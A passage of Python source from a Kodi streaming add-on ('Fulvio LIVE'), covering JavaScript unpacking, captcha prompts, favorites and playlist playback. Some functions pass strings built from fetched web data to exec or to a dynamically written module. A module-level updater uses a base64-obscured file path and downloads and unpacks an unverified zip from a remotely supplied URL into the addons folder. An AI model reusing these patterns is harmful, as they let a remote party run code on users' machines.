            ll1l.append(s[Il1l]);
        Il1l+=1;
        if (len(w) + len(i) + len(s) + len(e) == len(ll1l) + len(l1lI) + len(e)):
            break;

    lI1l = ''.join(ll1l)#.join('');
    I1lI = ''.join(l1lI)#.join('');
    ll1I = 0;
    l1ll = [];
    for lIll in range(0,len(ll1l),2):
        #print 'array i',lIll,len(ll1l)
        ll11 = -1;
        if ( ord(I1lI[ll1I]) % 2):
            ll11 = 1;
        #print 'val is ', lI1l[lIll: lIll+2]
        l1ll.append(chr(    int(lI1l[lIll: lIll+2], 36) - ll11));
        ll1I+=1;
        if (ll1I >= len(l1lI)):
            ll1I = 0;
    ret=''.join(l1ll)
    if 'eval(function(w,i,s,e)' in ret:
#        print 'STILL GOing'
        ret=re.compile('eval\(function\(w,i,s,e\).*}\((.*?)\)').findall(ret)[0]
        return get_unwise(ret)
    else:
#        print 'FINISHED'
        return ret

def get_unpacked( page_value, regex_for_text='', iterations=1, total_iteration=1):
    try:
        reg_data=None
        if page_value.startswith("http"):
            page_value= getUrl(page_value)
#        print 'page_value',page_value
        if regex_for_text and len(regex_for_text)>0:
            try:
                page_value=re.compile(regex_for_text).findall(page_value)[0] #get the js variable
            except: return 'NOTPACKED'

        page_value=unpack(page_value,iterations,total_iteration)
    except:
        page_value='UNPACKEDFAILED'
        traceback.print_exc(file=sys.stdout)
#    print 'unpacked',page_value
    if 'sav1live.tv' in page_value:
        page_value=page_value.replace('sav1live.tv','sawlive.tv') #quick fix some bug somewhere
#        print 'sav1 unpacked',page_value
    return page_value

def unpack(sJavascript,iteration=1, totaliterations=2  ):
#    print 'iteration',iteration
    if sJavascript.startswith('var _0xcb8a='):
        aSplit=sJavascript.split('var _0xcb8a=')
        ss="myarray="+aSplit[1].split("eval(")[0]
        exec(ss)
        a1=62
        c1=int(aSplit[1].split(",62,")[1].split(',')[0])
        p1=myarray[0]
        k1=myarray[3]
        with open('temp file'+str(iteration)+'.js', "wb") as filewriter:
            filewriter.write(str(k1))
        #aa=1/0
    else:

        if "rn p}('" in sJavascript:
            aSplit = sJavascript.split("rn p}('")
        else:
            aSplit = sJavascript.split("rn A}('")
#        print aSplit

        p1,a1,c1,k1=('','0','0','')

        ss="p1,a1,c1,k1=('"+aSplit[1].split(".spli")[0]+')'
        exec(ss)
    k1=k1.split('|')
    aSplit = aSplit[1].split("))'")
#    print ' p array is ',len(aSplit)
#   print len(aSplit )

    #p=str(aSplit[0]+'))')#.replace("\\","")#.replace('\\\\','\\')

    #print aSplit[1]
    #aSplit = aSplit[1].split(",")
    #print aSplit[0]
    #a = int(aSplit[1])
    #c = int(aSplit[2])
    #k = aSplit[3].split(".")[0].replace("'", '').split('|')
    #a=int(a)
    #c=int(c)

    #p=p.replace('\\', '')
#    print 'p val is ',p[0:100],'............',p[-100:],len(p)
#    print 'p1 val is ',p1[0:100],'............',p1[-100:],len(p1)

    #print a,a1
    #print c,a1
    #print 'k val is ',k[-10:],len(k)
#    print 'k1 val is ',k1[-10:],len(k1)
    e = ''
    d = ''#32823

    #sUnpacked = str(__unpack(p, a, c, k, e, d))
    sUnpacked1 = str(__unpack(p1, a1, c1, k1, e, d,iteration))

    #print sUnpacked[:200]+'....'+sUnpacked[-100:], len(sUnpacked)
#    print sUnpacked1[:200]+'....'+sUnpacked1[-100:], len(sUnpacked1)

    #exec('sUnpacked1="'+sUnpacked1+'"')
    if iteration>=totaliterations:
#        print 'final res',sUnpacked1[:200]+'....'+sUnpacked1[-100:], len(sUnpacked1)
        return sUnpacked1#.replace('\\\\', '\\')
    else:
#        print 'final res for this iteration is',iteration
        return unpack(sUnpacked1,iteration+1)#.replace('\\', ''),iteration)#.replace('\\', '');#unpack(sUnpacked.replace('\\', ''))

def __unpack(p, a, c, k, e, d, iteration,v=1):

    #with open('before file'+str(iteration)+'.js', "wb") as filewriter:
    #    filewriter.write(str(p))
    while (c >= 1):
        c = c -1
        if (k[c]):
            aa=str(__itoaNew(c, a))
            if v==1:
                p=re.sub('\\b' + aa +'\\b', k[c], p)# THIS IS Bloody slow!
            else:
                p=findAndReplaceWord(p,aa,k[c])

            #p=findAndReplaceWord(p,aa,k[c])


    #with open('after file'+str(iteration)+'.js', "wb") as filewriter:
    #    filewriter.write(str(p))
    return p

#
#function equalavent to re.sub('\\b' + aa +'\\b', k[c], p)
def findAndReplaceWord(source_str, word_to_find,replace_with):
    splits=None
    splits=source_str.split(word_to_find)
    if len(splits)>1:
        new_string=[]
        current_index=0
        for current_split in splits:
            #print 'here',i
            new_string.append(current_split)
            val=word_to_find#by default assume it was wrong to split

            #if its first one and item is blank then check next item is valid or not
            if current_index==len(splits)-1:
                val='' # last one nothing to append normally
            else:
                if len(current_split)==0: #if blank check next one with current split value
                    if ( len(splits[current_index+1])==0 and word_to_find[0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_') or (len(splits[current_index+1])>0  and splits[current_index+1][0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_'):# first just just check next
                        val=replace_with
                #not blank, then check current endvalue and next first value
                else:
                    if (splits[current_index][-1].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_') and (( len(splits[current_index+1])==0 and word_to_find[0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_') or (len(splits[current_index+1])>0  and splits[current_index+1][0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_')):# first just just check next
                        val=replace_with

            new_string.append(val)
            current_index+=1
        #aaaa=1/0
        source_str=''.join(new_string)
    return source_str

def __itoa(num, radix):
#    print 'num red',num, radix
    result = ""
    if num==0: return '0'
    while num > 0:
        result = "0123456789abcdefghijklmnopqrstuvwxyz"[num % radix] + result
        num /= radix
    return result

def __itoaNew(cc, a):
    aa="" if cc < a else __itoaNew(int(cc / a),a)
    cc = (cc % a)
    bb=chr(cc + 29) if cc> 35 else str(__itoa(cc,36))
    return aa+bb


def getCookiesString(cookieJar):
    try:
        cookieString=""
        for index, cookie in enumerate(cookieJar):
            cookieString+=cookie.name + "=" + cookie.value +";"
    except: pass
    #print 'cookieString',cookieString
    return cookieString


def saveCookieJar(cookieJar,COOKIEFILE):
    try:
        complete_path=os.path.join(profile,COOKIEFILE)
        cookieJar.save(complete_path,ignore_discard=True)
    except: pass

def getCookieJar(COOKIEFILE):

    cookieJar=None
    if COOKIEFILE:
        try:
            complete_path=os.path.join(profile,COOKIEFILE)
            cookieJar = cookielib.LWPCookieJar()
            cookieJar.load(complete_path,ignore_discard=True)
        except:
            cookieJar=None

    if not cookieJar:
        cookieJar = cookielib.LWPCookieJar()

    return cookieJar

def doEval(fun_call,page_data,Cookie_Jar,m):
    ret_val=''
    #print fun_call
    if functions_dir not in sys.path:
        sys.path.append(functions_dir)

#    print fun_call
    try:
        py_file='import '+fun_call.split('.')[0]
#        print py_file,sys.path
        exec( py_file)
#        print 'done'
    except:
        #print 'error in import'
        traceback.print_exc(file=sys.stdout)
#    print 'ret_val='+fun_call
    exec ('ret_val='+fun_call)
#    print ret_val
    #exec('ret_val=1+1')
    try:
        return str(ret_val)
    except: return ret_val

def doEvalFunction(fun_call,page_data,Cookie_Jar,m):
#    print 'doEvalFunction'
    ret_val=''
    if functions_dir not in sys.path:
        sys.path.append(functions_dir)
        
    f=open(os.path.join(functions_dir,'LSProdynamicCode.py'),"wb")
    f.write("# -*- coding: utf-8 -*-\n")
    f.write(fun_call.encode("utf-8"));
    
    f.close()
    import LSProdynamicCode
    ret_val=LSProdynamicCode.GetLSProData(page_data,Cookie_Jar,m)
    try:
        return str(ret_val)
    except: return ret_val


def getGoogleRecaptchaResponse(captchakey, cj,type=1): #1 for get, 2 for post, 3 for rawpost
#    #headers=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')]
#    html_text=getUrl(url,noredir=True, cookieJar=cj,headers=headers)
 #   print 'html_text',html_text
    recapChallenge=""
    solution=""
#    cap_reg="recap.*?\?k=(.*?)\""    
#    match =re.findall(cap_reg, html_text)
    
        
#    print 'match',match
    captcha=False
    captcha_reload_response_chall=None
    solution=None
    if len(captchakey)>0: #new shiny captcha!
        captcha_url=captchakey
        if not captcha_url.startswith('http'):
            captcha_url='http://www.google.com/recaptcha/api/challenge?k='+captcha_url+'&ajax=1'
#        print 'captcha_url',captcha_url
        captcha=True

        cap_chall_reg='challenge.*?\'(.*?)\''
        cap_image_reg='\'(.*?)\''
        captcha_script=getUrl(captcha_url,cookieJar=cj)
        recapChallenge=re.findall(cap_chall_reg, captcha_script)[0]
        captcha_reload='http://www.google.com/recaptcha/api/reload?c=';
        captcha_k=captcha_url.split('k=')[1]
        captcha_reload+=recapChallenge+'&k='+captcha_k+'&reason=i&type=image&lang=en'
        captcha_reload_js=getUrl(captcha_reload,cookieJar=cj)
        captcha_reload_response_chall=re.findall(cap_image_reg, captcha_reload_js)[0]
        captcha_image_url='http://www.google.com/recaptcha/api/image?c='+captcha_reload_response_chall
        if not captcha_image_url.startswith("http"):
            captcha_image_url='http://www.google.com/recaptcha/api/'+captcha_image_url
        import random
        n=random.randrange(100,1000,5)
        local_captcha = os.path.join(profile,str(n) +"captcha.img" )
        localFile = open(local_captcha, "wb")
        localFile.write(getUrl(captcha_image_url,cookieJar=cj))
        localFile.close()
        solver = InputWindow(captcha=local_captcha)
        solution = solver.get()
        os.remove(local_captcha)

    if captcha_reload_response_chall:
        if type==1:
            return 'recaptcha_challenge_field='+urllib.quote_plus(captcha_reload_response_chall)+'&recaptcha_response_field='+urllib.quote_plus(solution)
        elif type==2:
            return 'recaptcha_challenge_field:'+captcha_reload_response_chall+',recaptcha_response_field:'+solution
        else:
            return 'recaptcha_challenge_field='+urllib.quote_plus(captcha_reload_response_chall)+'&recaptcha_response_field='+urllib.quote_plus(solution)
    else:
        return ''
        

def getUrl(url, cookieJar=None,post=None, timeout=20, headers=None, noredir=False):


    cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)

    if noredir:
        opener = urllib2.build_opener(NoRedirection,cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
    else:
        opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
    #opener = urllib2.install_opener(opener)
    req = urllib2.Request(url)
    req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36')
    if headers:
        for h,hv in headers:
            req.add_header(h,hv)

    response = opener.open(req,post,timeout=timeout)
    link=response.read()
    response.close()
    return link;

def get_decode(str,reg=None):
    if reg:
        str=re.findall(reg, str)[0]
    s1 = urllib.unquote(str[0: len(str)-1]);
    t = '';
    for i in range( len(s1)):
        t += chr(ord(s1[i]) - s1[len(s1)-1]);
    t=urllib.unquote(t)
#    print t
    return t

def javascriptUnEscape(str):
    js=re.findall('unescape\(\'(.*?)\'',str)
#    print 'js',js
    if (not js==None) and len(js)>0:
        for j in js:
            #print urllib.unquote(j)
            str=str.replace(j ,urllib.unquote(j))
    return str

iid=0
def askCaptcha(m,html_page, cookieJar):
    global iid
    iid+=1
    expre= m['expres']
    page_url = m['page']
    captcha_regex=re.compile('\$LiveStreamCaptcha\[([^\]]*)\]').findall(expre)[0]

    captcha_url=re.compile(captcha_regex).findall(html_page)[0]
#    print expre,captcha_regex,captcha_url
    if not captcha_url.startswith("http"):
        page_='http://'+"".join(page_url.split('/')[2:3])
        if captcha_url.startswith("/"):
            captcha_url=page_+captcha_url
        else:
            captcha_url=page_+'/'+captcha_url

    local_captcha = os.path.join(profile, str(iid)+"captcha.jpg" )
    localFile = open(local_captcha, "wb")
#    print ' c capurl',captcha_url
    req = urllib2.Request(captcha_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')
    if 'referer' in m:
        req.add_header('Referer', m['referer'])
    if 'agent' in m:
        req.add_header('User-agent', m['agent'])
    if 'setcookie' in m:
#        print 'adding cookie',m['setcookie']
        req.add_header('Cookie', m['setcookie'])

    #cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)
    #opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
    #opener = urllib2.install_opener(opener)
    urllib2.urlopen(req)
    response = urllib2.urlopen(req)

    localFile.write(response.read())
    response.close()
    localFile.close()
    solver = InputWindow(captcha=local_captcha)
    solution = solver.get()
    return solution

def askCaptchaNew(imageregex,html_page,cookieJar,m):
    global iid
    iid+=1


    if not imageregex=='':
        if html_page.startswith("http"):
            page_=getUrl(html_page,cookieJar=cookieJar)
        else:
            page_=html_page
        captcha_url=re.compile(imageregex).findall(html_page)[0]
    else:
        captcha_url=html_page
        if 'oneplay.tv/embed' in html_page:
            import oneplay
            page_=getUrl(html_page,cookieJar=cookieJar)
            captcha_url=oneplay.getCaptchaUrl(page_)

    local_captcha = os.path.join(profile, str(iid)+"captcha.jpg" )
    localFile = open(local_captcha, "wb")
#    print ' c capurl',captcha_url
    req = urllib2.Request(captcha_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')
    if 'referer' in m:
        req.add_header('Referer', m['referer'])
    if 'agent' in m:
        req.add_header('User-agent', m['agent'])
    if 'accept' in m:
        req.add_header('Accept', m['accept'])
    if 'setcookie' in m:
#        print 'adding cookie',m['setcookie']
        req.add_header('Cookie', m['setcookie'])

    #cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)
    #opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
    #opener = urllib2.install_opener(opener)
    #urllib2.urlopen(req)
    response = urllib2.urlopen(req)

    localFile.write(response.read())
    response.close()
    localFile.close()
    solver = InputWindow(captcha=local_captcha)
    solution = solver.get()
    return solution

#########################################################
# Function  : GUIEditExportName                         #
#########################################################
# Parameter :                                           #
#                                                       #
# name        sugested name for export                  #
#                                                       # 
# Returns   :                                           #
#                                                       #
# name        name of export excluding any extension    #
#                                                       #
#########################################################
def TakeInput(name, headname):


    kb = xbmc.Keyboard('default', 'heading', True)
    kb.setDefault(name)
    kb.setHeading(headname)
    kb.setHiddenInput(False)
    return kb.getText()

   
#########################################################

class InputWindow(xbmcgui.WindowDialog):
    def __init__(self, *args, **kwargs):
        self.cptloc = kwargs.get('captcha')
        self.img = xbmcgui.ControlImage(335,30,624,60,self.cptloc)
        self.addControl(self.img)
        self.kbd = xbmc.Keyboard()

    def get(self):
        self.show()
        time.sleep(2)
        self.kbd.doModal()
        if (self.kbd.isConfirmed()):
            text = self.kbd.getText()
            self.close()
            return text
        self.close()
        return False

def getEpocTime():
    import time
    return str(int(time.time()*1000))

def getEpocTime2():
    import time
    return str(int(time.time()))

def get_params():
        param=[]
        paramstring=sys.argv[2]
        if len(paramstring)>=2:
            params=sys.argv[2]
            cleanedparams=params.replace('?','')
            if (params[len(params)-1]=='/'):
                params=params[0:len(params)-2]
            pairsofparams=cleanedparams.split('&')
            param={}
            for i in range(len(pairsofparams)):
                splitparams={}
                splitparams=pairsofparams[i].split('=')
                if (len(splitparams))==2:
                    param[splitparams[0]]=splitparams[1]
        return param

def getFavorites():
        addDir('[B][COLOR gold]PREFERITI[/COLOR][/B]','url',4,os.path.join(home, 'icon.png'),FANART,'','','','',True)
        items = json.loads(open(favorites).read())
        total = len(items)
        for i in items:
            name = i[0]
            url = i[1]
            iconimage = i[2]
            try:
                fanArt = i[3]
                if fanArt == None:
                    raise
            except:
                if addon.getSetting('use_thumb') == "true":
                    fanArt = iconimage
                else:
                    fanArt = fanart
            try: playlist = i[5]
            except: playlist = None
            try: regexs = i[6]
            except: regexs = None
            url=url.decode('utf-8')
            url = base64.b64decode(url)
            linkmode=['12','17','19','18','121','122','506']
            if any(str(i[4]) in x for x in linkmode):
                addLink(url,name,iconimage,fanArt,'','','','fav',playlist,regexs,total)
            else:
                addDir(name,url.encode('utf-8','ignore'),i[4],iconimage,fanart,'','','','','fav')

def addFavorite(name,url,iconimage,fanart,mode,playlist=None,regexs=None):
    favList = []
    url=url.encode('utf-8')
    url=base64.b64encode(url)
    try:
        # seems that after
        name = name.encode('ascii', 'ignore')
    except:
        pass
    if os.path.exists(favorites)==False:
        addon_log('Making Favorites File')
        favList.append((name,url,iconimage,fanart,mode,playlist,regexs))
        a = open(favorites, "w")
        a.write(json.dumps(favList))
        a.close()
    else:
        addon_log('Appending Favorites')
        a = open(favorites).read()
        data = json.loads(a)
        data.append((name,url,iconimage,fanart,mode))
        b = open(favorites, "w")
        b.write(json.dumps(data))
        b.close()
    xbmc.executebuiltin("XBMC.Container.Refresh")
    xbmc.executebuiltin("XBMC.Container.Update")

def rmFavorite(url):
    url=url.encode('utf-8')
    url=base64.b64encode(url)
    data = json.loads(open(favorites).read())
    for index in range(len(data)):
        if data[index][1]==url:
            del data[index]
            b = open(favorites, "w")
            b.write(json.dumps(data))
            b.close()
            break
    xbmc.executebuiltin("XBMC.Container.Refresh")
    xbmc.executebuiltin("XBMC.Container.Update")

def urlsolver(url):
    import urlresolver
    host = urlresolver.HostedMediaFile(url)
    if host:
        resolver = urlresolver.resolve(url)
        resolved = resolver
        if isinstance(resolved,list):
            for k in resolved:
                quality = addon.getSetting('quality')
                if k['quality'] == 'HD'  :
                    resolver = k['url']
                    break
                elif k['quality'] == 'SD' :
                    resolver = k['url']
                elif k['quality'] == '1080p' and addon.getSetting('1080pquality') == 'true' :
                    resolver = k['url']
                    break
        else:
            resolver = resolved
    else:
        xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,Urlresolver donot support this domain. - ,5000)")
        resolver=url
    return resolver

def tryplay(url,listitem,pdialogue=None):    

    if url.lower().startswith('plugin'):
        print 'playing via runplugin'
        xbmc.executebuiltin('XBMC.RunPlugin('+url+')') 
        for i in range(8):
            xbmc.sleep(500) ##sleep for 10 seconds, half each time
            try:
                #print 'condi'
                if xbmc.getCondVisibility("Player.HasMedia") and xbmc.Player().isPlaying():
                    return True
            except: pass
        return False
    import  CustomPlayer,time

    player = CustomPlayer.MyXBMCPlayer()
    player.pdialogue=pdialogue
    start = time.time() 
    #xbmc.Player().play( liveLink,listitem)
    print 'going to play'
    import time
    beforestart=time.time()
    player.play( url, listitem)
    xbmc.sleep(1000)
    
    try:
        while player.is_active:
            xbmc.sleep(400)
           
            if player.urlplayed:
                print 'yes played'
                return True
            if time.time()-beforestart>4: return False
            #xbmc.sleep(1000)
    except: pass
    print 'not played',url
    return False

def play_playlist(name, mu_playlist,queueVideo=None):
        playlist = xbmc.PlayList(xbmc.PLAYLIST_VIDEO)
        #print 'mu_playlist',mu_playlist
        if '$$LSPlayOnlyOne$$' in mu_playlist[0]:
            mu_playlist[0]=mu_playlist[0].replace('$$LSPlayOnlyOne$$','')
            import urlparse
            names = []
            iloop=0
            progress = xbmcgui.DialogProgress()
            progress.create('Progress', 'Trying Multiple Links')
            for i in mu_playlist:

                if '$$lsname=' in i:
                    d_name=i.split('$$lsname=')[1].split('&regexs')[0]
                    names.append(d_name)                                       
                    mu_playlist[iloop]=i.split('$$lsname=')[0]+('&regexs'+i.split('&regexs')[1] if '&regexs' in i else '')                    
                else:
                    d_name=urlparse.urlparse(i).netloc
                    if d_name == '':
                        names.append(name)
                    else:
                        names.append(d_name)
                index=iloop
                iloop+=1
                
                playname=names[index]
                if progress.iscanceled(): return 
                progress.update( iloop/len(mu_playlist)*100,"", "Link#%d"%(iloop),playname  )
                print 'auto playnamexx',playname
                if "&mode=19" in mu_playlist[index]:
                        #playsetresolved (urlsolver(mu_playlist[index].replace('&mode=19','')),name,iconimage,True)
                    liz = xbmcgui.ListItem(playname, iconImage=iconimage)
                    liz.setInfo(type='Video', infoLabels={'Title':playname})
                    liz.setProperty("IsPlayable","true")
                    urltoplay=urlsolver(mu_playlist[index].replace('&mode=19','').replace(';',''))
                    liz.setPath(urltoplay)
                    #xbmc.Player().play(urltoplay,liz)
                    played=tryplay(urltoplay,liz)
                elif "$doregex" in mu_playlist[index] :
#                    print mu_playlist[index]
                    sepate = mu_playlist[index].split('&regexs=')
#                    print sepate
                    url,setresolved = getRegexParsed(sepate[1], sepate[0])
                    url2 = url.replace(';','')
                    liz = xbmcgui.ListItem(playname, iconImage=iconimage)
                    liz.setInfo(type='Video', infoLabels={'Title':playname})
                    liz.setProperty("IsPlayable","true")
                    liz.setPath(url2)
                    #xbmc.Player().play(url2,liz)
                    played=tryplay(url2,liz)

                else:
                    url = mu_playlist[index]
                    url=url.split('&regexs=')[0]
                    liz = xbmcgui.ListItem(playname, iconImage=iconimage)
                    liz.setInfo(type='Video', infoLabels={'Title':playname})
                    liz.setProperty("IsPlayable","true")
                    liz.setPath(url)
                    #xbmc.Player().play(url,liz)
                    played=tryplay(url,liz)
                    print 'played',played
                print 'played',played
                if played: return
            return     
        if addon.getSetting('ask_playlist_items') == 'true' and not queueVideo :
            import urlparse
            names = []
            iloop=0
            for i in mu_playlist:
                if '$$lsname=' in i:
                    d_name=i.split('$$lsname=')[1].split('&regexs')[0]
                    names.append(d_name)                                       
                    mu_playlist[iloop]=i.split('$$lsname=')[0]+('&regexs'+i.split('&regexs')[1] if '&regexs' in i else '')                    
                else:
                    d_name=urlparse.urlparse(i).netloc
                    if d_name == '':
                        names.append(name)
                    else:
                        names.append(d_name)
                    
                iloop+=1
            dialog = xbmcgui.Dialog()
            index = dialog.select('Choose a video source', names)
            if index >= 0:
                playname=names[index]
                print 'playnamexx',playname
                if "&mode=19" in mu_playlist[index]:
                        #playsetresolved (urlsolver(mu_playlist[index].replace('&mode=19','')),name,iconimage,True)
                    liz = xbmcgui.ListItem(playname, iconImage=iconimage)
                    liz.setInfo(type='Video', infoLabels={'Title':playname})
                    liz.setProperty("IsPlayable","true")
                    urltoplay=urlsolver(mu_playlist[index].replace('&mode=19','').replace(';',''))
                    liz.setPath(urltoplay)
                    xbmc.Player().play(urltoplay,liz)
                elif "$doregex" in mu_playlist[index] :
#                    print mu_playlist[index]
                    sepate = mu_playlist[index].split('&regexs=')
#                    print sepate
                    url,setresolved = getRegexParsed(sepate[1], sepate[0])
                    url2 = url.replace(';','')
                    liz = xbmcgui.ListItem(playname, iconImage=iconimage)
                    liz.setInfo(type='Video', infoLabels={'Title':playname})
                    liz.setProperty("IsPlayable","true")
                    liz.setPath(url2)
                    xbmc.Player().play(url2,liz)

                else:
                    url = mu_playlist[index]
                    url=url.split('&regexs=')[0]
                    liz = xbmcgui.ListItem(playname, iconImage=iconimage)
                    liz.setInfo(type='Video', infoLabels={'Title':playname})
                    liz.setProperty("IsPlayable","true")
                    liz.setPath(url)
                    xbmc.Player().play(url,liz)
        elif not queueVideo:
            #playlist = xbmc.PlayList(1) # 1 means video
            playlist.clear()
            item = 0
            for i in mu_playlist:
                item += 1
                info = xbmcgui.ListItem('%s) %s' %(str(item),name))
                # Don't do this as regex parsed might take longer
                try:
                    if "$doregex" in i:
                        sepate = i.split('&regexs=')
#                        print sepate
                        url,setresolved = getRegexParsed(sepate[1], sepate[0])
                    elif "&mode=19" in i:
                        url = urlsolver(i.replace('&mode=19','').replace(';',''))                        
                    if url:
                        playlist.add(url, info)
                    else:
                        raise
                except Exception:
                    playlist.add(i, info)
                    pass #xbmc.Player().play(url)

            xbmc.executebuiltin('playlist.playoffset(video,0)')
        else:

                listitem = xbmcgui.ListItem(name)
                playlist.add(mu_playlist, listitem)

def tryplay2(url,listitem,pdialogue=None):    

    if url.lower().startswith('plugin'):
        print 'playing via runplugin'
        xbmc.executebuiltin('XBMC.RunPlugin('+url+')') 
        for i in range(8):
            xbmc.sleep(500) ##sleep for 10 seconds, half each time
            try:
                #print 'condi'
                if xbmc.getCondVisibility("Player.HasMedia") and xbmc.Player().isPlaying():
                    return True
            except: pass
        return False
    import  CustomPlayer,time

    player = CustomPlayer.MyXBMCPlayer()
    player.pdialogue=pdialogue
    start = time.time() 
    #xbmc.Player().play( liveLink,listitem)
    print 'going to play'
    import time
    beforestart=time.time()
    player.play( url, listitem)
    xbmc.sleep(1000)
    
    try:
        while player.is_active:
            xbmc.sleep(400)
           
            if player.urlplayed:
                print 'yes played'
                folder = addon.getSetting("download_path_list")
                file = os.path.join(folder, 'try-list-ON.txt')
                f = open(file, 'a')
                f.write(""+str(url.encode('utf-8'))+"\n")
                f.close()
                xbmc.sleep(200)
                player.stop()
                xbmc.sleep(200)
                return False
            if time.time()-beforestart>4: return False
            #xbmc.sleep(1000)
    except: pass
    print 'not played',url
    folder = addon.getSetting("download_path_list")
    file = os.path.join(folder, 'try-list-OFF.txt')
    f = open(file, 'a')
    f.write(""+str(url.encode('utf-8'))+"\n")
    f.close()
    xbmc.sleep(200)
    return False

def play_playlist2(name, mu_playlist,queueVideo=None):
        playlist = xbmc.PlayList(xbmc.PLAYLIST_VIDEO)
        #print 'mu_playlist',mu_playlist
        # if '$$LSPlayOnlyOne$$' in mu_playlist[0]:
        mu_playlist[0]=mu_playlist[0].replace('$$LSPlayOnlyOne$$','')
        import urlparse
        names = []
        iloop=0
        progress = xbmcgui.DialogProgress()
        progress.create('Progress', 'Trying Multiple Links')
        for i in mu_playlist:

            if '$$lsname=' in i:
                d_name=i.split('$$lsname=')[1].split('&regexs')[0]
                names.append(d_name)                                       
                mu_playlist[iloop]=i.split('$$lsname=')[0]+('&regexs'+i.split('&regexs')[1] if '&regexs' in i else '')                    
            else:
                d_name=urlparse.urlparse(i).netloc
                if d_name == '':
                    names.append(name)
                else:
                    names.append(d_name)
            index=iloop
            iloop+=1
            
            playname=names[index]
            if progress.iscanceled(): return 
            progress.update( iloop/len(mu_playlist)*100,"", "Link#%d"%(iloop),playname  )
            print 'auto playnamexx',playname
            if "&mode=19" in mu_playlist[index]:
                    #playsetresolved (urlsolver(mu_playlist[index].replace('&mode=19','')),name,iconimage,True)
                liz = xbmcgui.ListItem(playname, iconImage=iconimage)
                liz.setInfo(type='Video', infoLabels={'Title':playname})
                liz.setProperty("IsPlayable","true")
                urltoplay=urlsolver(mu_playlist[index].replace('&mode=19','').replace(';',''))
                liz.setPath(urltoplay)
                #xbmc.Player().play(urltoplay,liz)
                played=tryplay2(urltoplay,liz)
            elif "$doregex" in mu_playlist[index] :
#                    print mu_playlist[index]
                sepate = mu_playlist[index].split('&regexs=')
#                    print sepate
                url,setresolved = getRegexParsed(sepate[1], sepate[0])
                url2 = url.replace(';','')
                liz = xbmcgui.ListItem(playname, iconImage=iconimage)
                liz.setInfo(type='Video', infoLabels={'Title':playname})
                liz.setProperty("IsPlayable","true")
                liz.setPath(url2)
                #xbmc.Player().play(url2,liz)
                played=tryplay2(url2,liz)
            else:
                url = mu_playlist[index]
                url=url.split('&regexs=')[0]
                liz = xbmcgui.ListItem(playname, iconImage=iconimage)
                liz.setInfo(type='Video', infoLabels={'Title':playname})
                liz.setProperty("IsPlayable","true")
                liz.setPath(url)
                #xbmc.Player().play(url,liz)
                played=tryplay2(url,liz)
                print 'played',played
            print 'played',played
            if played: return
        return     

url00 = REMOTE_VERSION_FILE2
try:
    data = urllib2.urlopen(url00).read()
except:
    data = ""
version_publicada = find_single_match(data,"<version>([^<]+)</version>").strip()
dinamic_url = find_single_match(data,"<url>([^<]+)</url>").strip()
sur = find_single_match(data,"<sur>([^<]+)</sur>").strip()
sizeck = os.path.getsize(xbmc.translatePath(base64.decodestring('c3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi52aWRlby5mdWx2aW9saXZlL2RlZmF1bHQucHk=')))
sizeok = sur
if str(sizeck) != sizeok:
    AddonID = 'plugin.video.fulviolive'
    addon       = xbmcaddon.Addon(AddonID)
    addonname   = addon.getAddonInfo('name')
    extpath = os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8")) 
    addon_data_dir = os.path.join(xbmc.translatePath("special://userdata/addon_data" ).decode("utf-8"), AddonID) 
    dest = addon_data_dir + '/lastupdate.zip'    
    UPDATE_URL = dinamic_url
    xbmc.log('START DOWNLOAD UPDATE:' + UPDATE_URL)
    DownloaderClass2(UPDATE_URL,dest)  
    import ziptools
    unzipper = ziptools.ziptools()
    unzipper.extract(dest,extpath)
    if os.remove( dest ): xbmc.log('TEMPORARY ZIP REMOVED')
    xbmc.executebuiltin("UpdateLocalAddons")

def download_file(name, url):
        if addon.getSetting('save_location') == "":
            xbmc.executebuiltin("XBMC.Notification('Fulvio LIVE','Choose a location to save files.',15000,"+icon+")")
            addon.openSettings()
        params = {'url': url, 'download_path': addon.getSetting('save_location')}
        downloader.download(name, params)
        dialog = xbmcgui.Dialog()
        ret = dialog.yesno('Fulvio LIVE', 'Do you want to add this file as a source?')
        if ret:
            addSource(os.path.join(addon.getSetting('save_location'), name))

def _search(url,name):
   # print url,name
    pluginsearchurls = ['plugin://plugin.video.genesis/?action=shows_search',\
             'plugin://plugin.video.genesis/?action=movies_search',\
             'plugin://plugin.video.salts/?mode=search&amp;section=Movies',\
             'plugin://plugin.video.salts/?mode=search&amp;section=TV',\
             'plugin://plugin.video.muchmovies.hd/?action=movies_search',\
             'plugin://plugin.video.viooz.co/?action=root_search',\
             'plugin://plugin.video.ororotv/?action=shows_search',\
             'plugin://plugin.video.yifymovies.hd/?action=movies_search',\
             'plugin://plugin.video.cartoonhdtwo/?description&amp;fanart&amp;iconimage&amp;mode=3&amp;name=Search&amp;url=url',\
             'plugin://plugin.video.youtube/kodion/search/list/',\
             'plugin://plugin.video.dailymotion_com/?mode=search&amp;url',\
             'plugin://plugin.video.vimeo/kodion/search/list/'\
             ]
    names = ['Gensis TV','Genesis Movie','Salt movie','salt TV','Muchmovies','viooz','ORoroTV',\
